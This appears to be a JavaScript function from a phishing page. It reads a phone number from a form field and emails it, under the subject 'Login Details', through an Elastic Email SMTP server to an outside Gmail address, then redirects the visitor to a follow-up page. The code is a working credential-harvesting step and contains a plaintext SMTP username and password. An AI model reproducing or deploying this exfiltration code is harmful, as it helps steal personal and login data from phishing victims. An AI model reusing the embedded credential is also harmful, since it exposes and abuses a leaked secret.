function emailSend() {
  var phone = document.getElementById('phone').value;

  var messageBody = "Phone number" + phone;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "nelsf38@gmail.com",
    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
    To: 'sonkiban@gmail.com',
    From: "nelsf38@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'email.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}